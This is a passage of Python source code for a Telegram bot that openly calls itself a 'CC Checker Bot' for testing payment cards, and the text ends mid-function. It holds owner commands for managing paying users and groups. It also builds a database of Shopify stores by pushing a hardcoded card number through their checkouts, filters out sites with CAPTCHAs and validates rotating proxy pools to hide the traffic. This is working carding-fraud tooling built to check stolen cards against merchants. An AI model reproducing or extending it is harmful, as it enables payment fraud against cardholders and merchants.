    bot.edit_message_text(
        final_message,
        chat_id=message.chat.id,
        message_id=processing_msg.message_id,
        parse_mode='HTML'
    )


@bot.message_handler(commands=['limit'])
def handle_set_limit(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 Owner only command.")
        return
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "Usage: /limit <user_id> <new_limit>")
            return
        user_id = parts[1]
        new_limit = int(parts[2])
        if new_limit < 1:
            bot.reply_to(message, "❌ Limit must be at least 1.")
            return

        # Check if user exists in database
        if user_id not in users_data:
            bot.reply_to(message, f"❌ User {user_id} not found in database.")
            return

        # Update limit
        users_data[user_id]['limit'] = new_limit
        save_json(USERS_FILE, users_data)

        # Notify user (optional)
        try:
            bot.send_message(
                user_id,
                f"🔄 <b>Your mass check limit has been updated!</b>\n\n"
                f"New limit: <code>{new_limit}</code> cards per upload.",
                parse_mode='HTML'
            )
        except:
            pass

        bot.reply_to(message, f"✅ Limit for user {user_id} set to {new_limit}.")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number format.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['setlimit'])
def handle_set_limit(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 Owner only command.")
        return
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "Usage: /setlimit <user_id> <daily_limit>")
            return
        user_id = parts[1]
        new_limit = int(parts[2])
        if new_limit < 0:
            bot.reply_to(message, "❌ Limit cannot be negative.")
            return
        if user_id not in users_data:
            bot.reply_to(message, f"❌ User {user_id} not found.")
            return
        users_data[user_id]['daily_limit'] = new_limit
        save_json(USERS_FILE, users_data)
        bot.reply_to(message, f"✅ Daily limit for user {user_id} set to {new_limit}.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['resetusage'])
def handle_reset_usage(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 Owner only command.")
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "Usage: /resetusage <user_id>")
            return
        user_id = parts[1]
        if user_id not in users_data:
            bot.reply_to(message, f"❌ User {user_id} not found.")
            return
        users_data[user_id]['usage_today'] = 0
        users_data[user_id]['last_usage_reset'] = date.today().isoformat()
        save_json(USERS_FILE, users_data)
        bot.reply_to(message, f"✅ Usage for user {user_id} reset.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")


@bot.message_handler(commands=['grant'])
def handle_approve_group(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 Owner only command.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "Usage: /grant <chat_id>")
            return
        
        chat_id = parts[1]
        
        # Add group to approved list
        groups_data[chat_id] = {
            'approved_by': message.from_user.id,
            'approved_date': datetime.now().isoformat(),
            'title': "Unknown Group"
        }
        
        # Try to get group info
        try:
            chat = bot.get_chat(chat_id)
            groups_data[chat_id]['title'] = chat.title
        except:
            pass
        
        save_json(GROUPS_FILE, groups_data)
        
        # Send welcome message to group
        try:
            welcome_msg = """
┏━━━━━━━⍟
┃ <b> 𝐆𝐫𝐨𝐮𝐩 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝! 🔥</b>
┗━━━━━━━━━━━⊛

🎉 <b>This group has been granted access to the CC Checker Bot!</b>

<b>Available Commands:</b>
• /sh CC|MM|YYYY|CVV - Check single card
• /msh - Mass check multiple cards
• /help - Show all commands

<b>Rules:</b>
• No spam commands
• Use responsibly
• Respect flood controls

<b>Happy Cooking! 🍳</b>

[<a href="https://t.me/Nova_bot_update">⌬</a>] <b>Bot By:</b> <a href="tg://user?id={DARKS_ID}">⏤‌‌Unknownop ꯭𖠌</a>
"""
            bot.send_message(chat_id, welcome_msg, parse_mode='HTML')
        except Exception as e:
            bot.reply_to(message, f"✅ Group {chat_id} approved, but could not send welcome message: {str(e)}")
            return
        
        bot.reply_to(message, f"✅ Group {chat_id} approved and welcome message sent!")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['users'])
def handle_list_users(message):
    if not is_owner(message.from_user.id):
        return

    if not users_data:
        bot.reply_to(message, "No approved users found.")
        return

    # Load user proxies to count them
    user_proxies = load_json(USER_PROXIES_FILE, {})

    users_list = "<b>👥 Approved Users:</b>\n\n"

    for user_id, data in users_data.items():
        try:
            expiry_str = data.get('expiry')
            status = "✅ Active"
            days_left_str = "Unknown"

            if expiry_str:
                try:
                    expiry_date = datetime.fromisoformat(expiry_str)
                    days_left = (expiry_date - datetime.now()).days
                    if days_left < 0:
                        status = "❌ Expired"
                    days_left_str = f"{days_left} days"
                except ValueError:
                    days_left_str = "Invalid Date"
            else:
                status = "🔥 Lifetime"
                days_left_str = "∞"

            # Get user's proxy count
            proxy_count = len(user_proxies.get(user_id, []))

            users_list += f"🆔 <code>{user_id}</code>\n"
            users_list += f"📅 Time Left: {days_left_str}\n"
            users_list += f"📊 Per‑upload limit: {data.get('limit', 1000)}\n"
            users_list += f"🌐 Proxies added: {proxy_count}\n"
            users_list += f"🔰 Status: {status}\n"
            users_list += "━━━━━━━━━━━━━━━━━━━\n"

        except Exception as e:
            print(f"Error listing user {user_id}: {e}")
            continue

    if len(users_list) > 4000:
        for x in range(0, len(users_list), 4000):
            bot.reply_to(message, users_list[x:x+4000], parse_mode='HTML')
    else:
        bot.reply_to(message, users_list, parse_mode='HTML')

@bot.message_handler(commands=['rmuser', 'ban'])
def handle_remove_user(message):
    if not is_owner(message.from_user.id):
        return

    try:
        # Usage: /rmuser 123456789
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/rmuser user_id</code>", parse_mode='HTML')
            return

        target_id = parts[1].strip()
        
        if target_id in users_data:
            del users_data[target_id]
            save_json(USERS_FILE, users_data)
            bot.reply_to(message, f"✅ <b>Success!</b>\nUser <code>{target_id}</code> has been banned/removed.", parse_mode='HTML')
        else:
            bot.reply_to(message, f"❌ <b>Error:</b> User <code>{target_id}</code> not found in database.", parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")


@bot.message_handler(commands=['showid'])
def handle_show_site_by_id(message):
    if not is_owner(message.from_user.id):
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "Usage: /showid <id>")
            return
        site_id = int(parts[1])
        
        site = next((s for s in sites_data.get('sites', []) if s.get('id') == site_id), None)
        if not site:
            bot.reply_to(message, f"❌ Site ID {site_id} not found.")
            return
        
        text = f"""
<b>🆔 Site ID:</b> <code>{site_id}</code>
<b>🌐 URL:</b> {site['url']}
<b>💰 Price:</b> ${site.get('price', '0.00')}
<b>🛡️ Gateway:</b> {site.get('gateway', 'Unknown')}
<b>📋 Last Response:</b> {site.get('last_response', 'N/A')}
"""
        bot.reply_to(message, text, parse_mode='HTML')
    except:
        bot.reply_to(message, "Invalid ID format.")
        
@bot.message_handler(commands=['rsite', 'rmsite', 'delsite'])
def handle_remove_site(message):
    if not is_owner(message.from_user.id):
        return

    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/rsite https://badsite.com</code>", parse_mode='HTML')
            return

        # Get the input and clean it (remove https://, http://, and extra paths)
        raw_input = parts[1].strip().lower()
        clean_target = raw_input.replace('https://', '').replace('http://', '').split('/')[0]

        original_count = len(sites_data['sites'])
        new_sites = []
        removed_count = 0

        # Filter: Keep sites that DO NOT match the target
        for site in sites_data['sites']:
            site_url = site.get('url', '').lower()
            if clean_target in site_url:
                removed_count += 1
            else:
                new_sites.append(site)
        
        # Save Update
        if removed_count > 0:
            sites_data['sites'] = new_sites
            save_json(SITES_FILE, sites_data)
            bot.reply_to(message, f"✅ <b>Deleted {removed_count} sites</b> matching:\n<code>{clean_target}</code>", parse_mode='HTML')
        else:
            bot.reply_to(message, f"⚠️ <b>Not Found:</b> No sites matched <code>{clean_target}</code>", parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['rmsiteid'])
def handle_remove_site_by_id(message):
    if not is_owner(message.from_user.id):
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "Usage: /rmsiteid <id>")
            return
        site_id = int(parts[1])

        original_count = len(sites_data.get('sites', []))
        sites_data['sites'] = [s for s in sites_data.get('sites', []) if s.get('id') != site_id]

        if len(sites_data['sites']) == original_count:
            bot.reply_to(message, f"❌ Site ID {site_id} not found.")
            return

        save_json(SITES_FILE, sites_data)
        bot.reply_to(message, f"✅ Removed site ID {site_id}.")
    except:
        bot.reply_to(message, "Invalid ID format.")

@bot.message_handler(commands=['debug'])
def debug_data(message):
    if message.from_user.id not in OWNER_ID:
        return
    
    # SAFE - no raw dump, just counts
    sites_count = len(sites_data.get('sites', [])) if isinstance(sites_data, dict) else len(sites_data) if sites_data else 0
    proxies_count = len(proxies_data.get('proxies', [])) if isinstance(proxies_data, dict) else len(proxies_data) if proxies_data else 0
    
    sites_preview = str(sites_data)[:200] + "..." if len(str(sites_data)) > 200 else str(sites_data)
    proxies_preview = str(proxies_data)[:200] + "..." if len(str(proxies_data)) > 200 else str(proxies_data)
    
    msg = (
        f"**Sites:** `{sites_count}`\n"
        f"**Proxies:** `{proxies_count}`\n\n"
        f"**Sites structure:**\n```{sites_preview}```\n\n"
        f"**Proxies structure:**\n```{proxies_preview}```"
    )
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast', 'bc'])
def handle_broadcast(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 Owner only command.")
        return
    
    # Extract the message text
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 and not message.reply_to_message:
        bot.reply_to(message, "⚠️ <b>Usage:</b> `/broadcast Hello everyone!`\nOr reply to a message with `/broadcast`", parse_mode='Markdown')
        return

    broadcast_msg = parts[1] if len(parts) > 1 else message.reply_to_message.text
    
    # Add a header so people know it's an announcement
    formatted_msg = f"📢 <b>ANNOUNCEMENT</b> 📢\n━━━━━━━━━━━━━━━━━━━\n\n{broadcast_msg}\n\n━━━━━━━━━━━━━━━━━━━\n<i>- Bot Admin</i>"
    
    status_msg = bot.reply_to(message, "⏳ <i>Starting broadcast...</i>", parse_mode='HTML')
    
    success_count = 0
    fail_count = 0
    
    # Broadcast to all approved users
    for user_id in users_data.keys():
        try:
            bot.send_message(user_id, formatted_msg, parse_mode='HTML')
            success_count += 1
            time.sleep(0.1)  # Sleep to prevent Telegram API flood limits
        except Exception:
            fail_count += 1
            
    # Broadcast to all approved groups
    for group_id in groups_data.keys():
        try:
            bot.send_message(group_id, formatted_msg, parse_mode='HTML')
            success_count += 1
            time.sleep(0.1)
        except Exception:
            fail_count += 1

    bot.edit_message_text(
        f"✅ <b>Broadcast Completed!</b>\n\n"
        f"🟢 Sent successfully: {success_count}\n"
        f"🔴 Failed (Bot blocked/kicked): {fail_count}",
        message.chat.id, status_msg.message_id, parse_mode='HTML'
    )

@bot.message_handler(commands=['addurls'])
def handle_addurls(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only")
        return
    bot.reply_to(
        message,
        "📋 **Send .txt file with sites**\n\n"
        "One URL per line - I'll validate each one and fetch the actual product price.",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(message, process_addurls_file)


def process_addurls_file(message):
    """Process uploaded sites file with validation and assign stable IDs."""
    try:
        if not message.document or not message.document.file_name.endswith('.txt'):
            bot.reply_to(message, "❌ Send a **.txt** file only")
            return

        status_msg = bot.reply_to(message, "📥 Downloading file...")

        # Download file
        file_info = bot.get_file(message.document.file_id)
        file_data = bot.download_file(file_info.file_path)
        content = file_data.decode('utf-8', errors='ignore')

        # Extract URLs
        lines = [line.strip() for line in content.split('\n') if line.strip()]
        lines = list(set(lines))  # Remove duplicates

        if not lines:
            bot.edit_message_text("❌ No URLs found", message.chat.id, status_msg.message_id)
            return

        bot.edit_message_text(f"🔍 Deep Validating **{len(lines)}** sites...\n⏳ Starting...",
                              message.chat.id, status_msg.message_id, parse_mode="Markdown")

        added = 0
        skipped = 0
        captcha_count = 0
        total = len(lines)
        test_cc = "5242430428405662|03|28|323"  # Test card

        for idx, site_url in enumerate(lines, 1):
            try:
                # Clean URL
                site_url = site_url.strip()
                if not site_url.startswith(('http://', 'https://')):
                    site_url = f"https://{site_url}"
                site_url = site_url.rstrip('/')

                # Grab a proxy
                proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None

                # 1. Simple Check First (Fast)
                if not validate_shopify_site(site_url, proxy=proxy):
                    skipped += 1
                    continue

                # 2. DEEP CHECK – perform a dry-run check with test card
                response = check_shopify_api(site_url, test_cc, proxy)
                
                is_valid = False
                gateway_name = "Shopify Payments"
                captcha_detected = False

                if isinstance(response, dict):
                    status = response.get('status', '').upper()
                    msg_text = (response.get('message') or response.get('Response') or '').upper()

                    if 'CAPTCHA' in msg_text or 'CHALLENGE' in msg_text:
                        captcha_detected = True
                        captcha_count += 1
                    elif status in ['APPROVED', 'APPROVED_OTP', 'DECLINED']:
                        is_valid = True
                    elif status == 'ERROR':
                        decline_keywords = ['DECLINED', 'INSUFFICIENT', 'INCORRECT', 'FRAUD', 'CARD', 'FUNDS', 'CVV', 'ZIP', 'GENERIC', 'ERROR']
                        if any(k in msg_text for k in decline_keywords):
                            is_valid = True

                if is_valid:
                    # Site passed deep validation – fetch the actual cheapest price
                    actual_price = get_site_price(site_url, timeout=10)

                    # Check duplicate
                    if not any(s['url'] == site_url for s in sites_data['sites']):
                        new_id = get_next_site_id()
                        sites_data['sites'].append({
                            'id': new_id,
                            'url': site_url,
                            'name': site_url.replace('https://', '').replace('http://', ''),
                            'price': f"{actual_price:.2f}",
                            'gateway': gateway_name,
                            'last_response': response.get('Response', 'Unknown') if isinstance(response, dict) else 'Unknown'
                        })
                        added += 1
                    else:
                        skipped += 1
                else:
                    skipped += 1

                # Update progress every 5 sites
                if idx % 5 == 0 or idx == total:
                    bot.edit_message_text(
                        f"🔍 **Deep Validation Progress**\n"
                        f"Checked: {idx}/{total}\n"
                        f"✅ Added: {added}\n"
                        f"⛔ Captcha/Bad: {captcha_count}\n"
                        f"⚠️ Skipped: {skipped - captcha_count}",
                        message.chat.id, status_msg.message_id,
                        parse_mode="Markdown"
                    )

                time.sleep(1)  # Slight delay to be safe

            except Exception as e:
                print(f"❌ Exception for {site_url}: {e}")
                skipped += 1
                continue

        # Save and final report
        save_json(SITES_FILE, sites_data)

        final_text = (
            f"✅ **FILTERING COMPLETE!**\n\n"
            f"➕ Added: **{added}** (Working Sites)\n"
            f"⛔ Blocked: **{captcha_count}** (Captcha/No Token)\n"
            f"📦 Total in DB: **{len(sites_data['sites'])}**"
        )

        bot.edit_message_text(final_text, message.chat.id, status_msg.message_id, parse_mode="Markdown")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
                
def validate_shopify_site(site_url, proxy=None, timeout=10):
    """Simple Shopify validation - WITH PROXY SUPPORT"""
    try:
        if not site_url.startswith(('http://', 'https://')):
            site_url = f"https://{site_url}"
        site_url = site_url.rstrip('/')
        
        # Setup proxy dictionary if a proxy is provided
        proxies_dict = None
        if proxy:
            parts = proxy.split(':')
            if len(parts) == 2:
                formatted = f"http://{parts[0]}:{parts[1]}"
                proxies_dict = {'http': formatted, 'https': formatted}
            elif len(parts) == 4:
                formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                proxies_dict = {'http': formatted, 'https': formatted}

        r = requests.get(
            f"{site_url}/products.json?limit=5",
            timeout=timeout,
            proxies=proxies_dict,  # <--- PROXY ADDED HERE
            verify=False
        )
        
        if r.status_code != 200:
            return False
        
        data = r.json()
        products = data.get('products', [])
        
        # Must have available products
        for p in products:
            for v in p.get('variants', []):
                if v.get('available'):
                    return True
        
        return False
        
    except:
        return False

def get_site_price(site_url, timeout=10):
    """Get cheapest price from site"""
    try:
        if not site_url.startswith(('http://', 'https://')):
            site_url = f"https://{site_url}"
        site_url = site_url.rstrip('/')
        
        r = requests.get(
            f"{site_url}/products.json?limit=50",
            timeout=timeout,
            verify=False
        )
        
        if r.status_code != 200:
            return 0.00
        
        data = r.json()
        products = data.get('products', [])
        
        prices = []
        for p in products:
            for v in p.get('variants', []):
                if v.get('available'):
                    try:
                        price = float(v.get('price', 0))
                        if price > 0:
                            prices.append(price)
                    except:
                        pass
        
        return min(prices) if prices else 0.00
        
    except:
        return 0.00

def validate_shopify_site_debug(site_url, timeout=10):
    """DEBUG VERSION - shows why sites fail"""
    try:
        print(f"🔍 Testing: {site_url}")  # Console debug
        
        if not site_url.startswith(('http://', 'https://')):
            site_url = f"https://{site_url}"
        site_url = site_url.rstrip('/')
        
        print(f"   → Full URL: {site_url}")
        
        r = requests.get(
            f"{site_url}/products.json?limit=5",
            timeout=timeout,
            verify=False
        )
        
        print(f"   → Status: {r.status_code}")
        
        if r.status_code != 200:
            print(f"   ❌ HTTP {r.status_code}")
            return False
        
        data = r.json()
        products = data.get('products', [])
        print(f"   → Products found: {len(products)}")
        
        available = False
        for p in products:
            for v in p.get('variants', []):
                if v.get('available'):
                    available = True
                    print(f"   ✅ Found available product: {p.get('title', 'Unknown')}")
                    break
            if available:
                break
        
        if available:
            print(f"   ✅ VALID SITE")
        else:
            print(f"   ❌ No available products")
        
        return available
        
    except Exception as e:
        print(f"   ❌ Exception: {str(e)}")
        return False

    
# ==========================================
# REPLACE handle_add_proxy_command IN app.py
# ==========================================

@bot.message_handler(commands=['addpro'])
def handle_add_proxy_command(message):
    """
    Handle /addpro command - Adds a single proxy with STRICT validation.
    """
    try:
        if " " not in message.text:
            bot.reply_to(message, "❌ <b>Usage:</b> <code>/addpro ip:port:user:pass</code>", parse_mode='HTML')
            return
        
        proxy = message.text.split(' ', 1)[1].strip()
        parts = proxy.split(':')
        
        if len(parts) not in [2, 4]:
            bot.reply_to(message, "❌ <b>Format Error:</b> Use <code>ip:port</code> or <code>ip:port:user:pass</code>", parse_mode='HTML')
            return

        status_msg = bot.reply_to(message, f"⏳ <b>Checking Proxy:</b> <code>{parts[0]}</code>...", parse_mode='HTML')

        def check_and_save():
            try:
                if len(parts) == 2:
                    formatted = f"http://{parts[0]}:{parts[1]}"
                elif len(parts) == 4:
                    formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                
                proxies_dict = {'http': formatted, 'https': formatted}
                
                # STRICT CHECK against Google (5s timeout)
                start_t = time.time()
                r = requests.get("http://www.google.com", proxies=proxies_dict, timeout=5)
                ping = int((time.time() - start_t) * 1000)
                
                if r.status_code == 200:
                    user_id_str = str(message.from_user.id)
                    
                    if user_id_str not in user_proxies_data:
                        user_proxies_data[user_id_str] = []
                    
                    is_new_to_user = False
                    
                    # 1. Silently save to GLOBAL Database if not exists
                    if proxy not in proxies_data['proxies']:
                        proxies_data['proxies'].append(proxy)
                        save_json(PROXIES_FILE, proxies_data)
                    
                    # 2. Save to USER'S Personal Database
                    if proxy not in user_proxies_data[user_id_str]:
                        user_proxies_data[user_id_str].append(proxy)
                        save_json(USER_PROXIES_FILE, user_proxies_data)
                        is_new_to_user = True
                    
                    if is_new_to_user:
                        bot.edit_message_text(
                            f"✅ <b>Proxy Added Successfully!</b>\n\n"
                            f"🌐 <code>{parts[0]}</code>\n"
                            f"⚡ Ping: {ping}ms\n"
                            f"📦 Your Total Proxies: {len(user_proxies_data[user_id_str])}",
                            message.chat.id, status_msg.message_id, parse_mode='HTML'
                        )
                    else:
                        bot.edit_message_text(
                            f"⚠️ <b>Duplicate Proxy</b>\n\n"
                            f"🌐 <code>{parts[0]}</code> is already in your personal pool.",
                            message.chat.id, status_msg.message_id, parse_mode='HTML'
                        )
                else:
                    raise Exception("Status not 200")

            except Exception as e:
                bot.edit_message_text(
                    f"❌ <b>Dead Proxy</b>\n\n"
                    f"🌐 <code>{parts[0]}</code> could not connect.\n"
                    f"<i>Not saved to database.</i>",
                    message.chat.id, status_msg.message_id, parse_mode='HTML'
                )

        threading.Thread(target=check_and_save).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def handle_mass_proxy_upload(message):
    """Mass add proxies from a TXT file to the SERVER database"""
    if not is_owner(message.from_user.id):
        return

    bot.reply_to(message, "📂 <b>Send a .txt file containing proxies.</b>\nFormat: <code>ip:port:user:pass</code>", parse_mode='HTML')
    bot.register_next_step_handler(message, process_proxy_file_upload)


def process_proxy_file_upload(message):
    """
    Mass add proxies from TXT file with VALIDATION.
    Checks proxies before saving them to the database.
    """
    try:
        if not message.document or not message.document.file_name.endswith('.txt'):
            bot.reply_to(message, "❌ Invalid file. Please send a .txt file.")
            return

        status_msg = bot.reply_to(message, "⏳ <b>Downloading and Reading file...</b>", parse_mode='HTML')
        
        # 1. Download and Parse
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        content = downloaded_file.decode('utf-8', errors='ignore')
        
        raw_proxies = list(set([line.strip() for line in content.split('\n') if ':' in line]))
        total_found = len(raw_proxies)
        
        if total_found == 0:
            bot.edit_message_text("❌ No valid proxies found in file.", message.chat.id, status_msg.message_id)
            return

        bot.edit_message_text(f"⚡ <b>Checking {total_found} proxies...</b>\n<i>This may take a moment.</i>", message.chat.id, status_msg.message_id, parse_mode='HTML')

        # 2. Define Fast Checker
        live_proxies = []
        
        def check_single_proxy(proxy):
            try:
                parts = proxy.split(':')
                if len(parts) == 2:
                    formatted = f"http://{parts[0]}:{parts[1]}"
                elif len(parts) == 4:
                    formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                else:
                    return None
                
                proxies_dict = {'http': formatted, 'https': formatted}
                
                # Check against Google for speed (5s timeout)
                r = requests.get("http://www.google.com", proxies=proxies_dict, timeout=5)
                if r.status_code == 200:
                    return proxy
            except:
                pass
            return None

        # 3. Run Checks concurrently (Fast)
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(check_single_proxy, p) for p in raw_proxies]
            
            for i, future in enumerate(as_completed(futures)):
                result = future.result()
                if result:
                    live_proxies.append(result)
                
                # Update UI every 50 checks
                if i % 50 == 0:
                    try:
                        bot.edit_message_text(
                            f"⚡ <b>Checking Proxies...</b>\n"
                            f"Total: {total_found}\n"
                            f"Checked: {i}/{total_found}\n"
                            f"✅ Live: {len(live_proxies)}", 
                            message.chat.id, status_msg.message_id, parse_mode='HTML'
                        )
                    except: pass

        # 4. Save only LIVE proxies
        added_count = 0
        for proxy in live_proxies:
            if proxy not in proxies_data['proxies']:
                proxies_data['proxies'].append(proxy)
                added_count += 1
        
        save_json(PROXIES_FILE, proxies_data)
        
        # 5. Final Report
        bot.edit_message_text(
            f"✅ <b>Proxy Import Complete</b>\n\n"
            f"📥 Uploaded: {total_found}\n"
            f"🟢 Live: {len(live_proxies)}\n"
            f"🔴 Dead: {total_found - len(live_proxies)}\n"
            f"🆕 Added to DB: {added_count}\n"
            f"📦 Total Database: {len(proxies_data['proxies'])}",
            message.chat.id,
            status_msg.message_id,
            parse_mode='HTML'
        )

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['groups'])
def handle_list_groups(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 Owner only command.")
        return
    
    if not groups_data:
        bot.reply_to(message, "No approved groups found.")
        return
    
    # Check if groups_data is properly structured
    if not isinstance(groups_data, dict):
        bot.reply_to(message, "❌ Error: Groups data format is invalid.")
        return
    
    groups_list = "<b>👥 Approved Groups:</b>\n\n"
    
    for chat_id, data in groups_data.items():
        # Check if data is a dictionary
        if not isinstance(data, dict):
            groups_list += f"🆔 <code>{chat_id}</code>\n"
            groups_list += f"📛 Title: Invalid data format\n"
            groups_list += "━━━━━━━━━━━━━━━━━━━\n"
            continue
            
        try:
            approved_date = datetime.fromisoformat(data.get('approved_date', datetime.now().isoformat()))
            title = data.get('title', 'Unknown Group')
            
            groups_list += f"🆔 <code>{chat_id}</code>\n"
            groups_list += f"📛 Title: {title}\n"
            groups_list += f"📅 Approved: {approved_date.strftime('%Y-%m-%d')}\n"
            groups_list += "━━━━━━━━━━━━━━━━━━━\n"
        except Exception as e:
            groups_list += f"🆔 <code>{chat_id}</code>\n"
            groups_list += f"📛 Title: Error parsing data\n"
            groups_list += f"❌ Error: {str(e)}\n"
            groups_list += "━━━━━━━━━━━━━━━━━━━\n"
    
    bot.reply_to(message, groups_list, parse_mode='HTML')

def extract_urls(text):
    """
    Extract valid URLs from text that might contain jumbled/waste characters
    """
    # Split the text and look for potential URLs
    parts = text.split()
    potential_urls = []
    
    # Remove the command itself
    if parts and parts[0] == '/addurls':
        parts = parts[1:]
    
    # Try to find URLs in each part
    for part in parts:
        # Clean the part by removing non-URL characters from start/end
        cleaned = clean_string(part)
        
        # Check if it looks like a URL
        if is_likely_url(cleaned):
            # Ensure it has a scheme
            if not cleaned.startswith(('http://', 'https://')):
                cleaned = 'https://' + cleaned
            potential_urls.append(cleaned)
    
    return potential_urls

def clean_string(s):
    """
    Remove junk characters from the start and end of a string
    """
    # Remove non-alphanumeric characters from start
    while s and not s[0].isalnum():
        s = s[1:]
    
    # Remove non-alphanumeric characters from end
    while s and not s[-1].isalnum():
        s = s[:-1]
    
    return s

def is_likely_url(s):
    """
    Check if a string is likely to be a URL
    """
    # Check for common TLDs
    tlds = ['.com', '.org', '.net', '.io', '.gov', '.edu', '.info', '.co', '.uk', '.us', '.ca', '.au', '.de', '.fr']
    
    # Check if it contains a TLD
    has_tld = any(tld in s for tld in tlds)
    
    # Check if it has a domain structure
    has_domain_structure = '.' in s and len(s.split('.')) >= 2
    
    # Check if it's not too short
    not_too_short = len(s) > 4
    
    return (has_tld or has_domain_structure) and not_too_short


def process_add_sites(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Please provide URLs to add. Format: /addurls <url1> <url2> ...")
        return
    
    # Extract and clean URLs from the message
    raw_text = message.text
    urls = extract_urls(raw_text)
    
    if not urls:
        bot.reply_to(message, "No valid URLs found in your message.")
        return
    
    added_count = 0
    total_count = len(urls)
    
    # Send initial processing message
    status_msg = bot.reply_to(message, f"🔍 Checking {total_count} sites...\n\nAdded: 0/{total_count}\nSkipped: 0/{total_count}")
    
    skipped_count = 0
    
    # Get a random proxy for testing sites
    proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None
    
    for i, url in enumerate(urls):
        # Update status message
        try:
            bot.edit_message_text(
                f"🔍 Checking {total_count} sites...\n\nChecking: {url}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                chat_id=message.chat.id,
                message_id=status_msg.message_id
            )
        except:
            pass
        
        # Test the URL with a sample card USING PROXY
        test_cc = "5242430428405662|03|28|323"
        
        # Use the proxy when checking the site
        response = check_shopify_api(url, test_cc, proxy)
            
        if response:
            response_upper = response.get("Response", "").upper()
            # Check if response is valid
            if any(x in response_upper for x in ['CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                                               'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                                               'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED', 'INCORRECT_NUMBER', "INVALID_TOKEN", "AUTHENTICATION_ERROR"]):
                
                # Get price from response or use default
                price = response.get("Price", "0.00")
                
                # Check if site already exists
                site_exists = any(site['url'] == url for site in sites_data['sites'])
                
                if not site_exists:
                    # Add site to list
                    sites_data['sites'].append({
                        "url": url,
                        "price": price,
                        "last_response": response.get("Response", "Unknown"),
                        "gateway": response.get("Gateway", "Unknown"),
                        "tested_with_proxy": proxy if proxy else "No proxy"
                    })
                    added_count += 1
                    
                    # Update status with success
                    try:
                        if proxy:
                            bot.edit_message_text(
                                f"🔍 Checking {total_count} sites...\n\n✅ Added with proxy: {url}\nProxy: {proxy.split(':')[0] if proxy else 'No proxy'}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                                chat_id=message.chat.id,
                                message_id=status_msg.message_id
                            )
                        else:
                            bot.edit_message_text(
                                f"🔍 Checking {total_count} sites...\n\n✅ Added (no proxy): {url}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                                chat_id=message.chat.id,
                                message_id=status_msg.message_id
                            )
                    except:
                        pass
                else:
                    skipped_count += 1
                    # Update status with skip (duplicate)
                    try:
                        bot.edit_message_text(
                            f"🔍 Checking {total_count} sites...\n\n⚠️ Skipped (duplicate): {url}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                            chat_id=message.chat.id,
                            message_id=status_msg.message_id
                        )
                    except:
                        pass
            else:
                skipped_count += 1
                # Update status with skip (invalid response)
                try:
                    bot.edit_message_text(
                        f"🔍 Checking {total_count} sites...\n\n❌ Skipped (invalid): {url}\nResponse: {response.get('Response', 'NO_RESPONSE')}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                except:
                    pass
        else:
            skipped_count += 1
            # Update status with skip (no response)
            try:
                if proxy:
                    bot.edit_message_text(
                        f"🔍 Checking {total_count} sites...\n\n❌ Skipped (no response with proxy): {url}\nProxy: {proxy.split(':')[0] if proxy else 'No proxy'}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                else:
                    bot.edit_message_text(
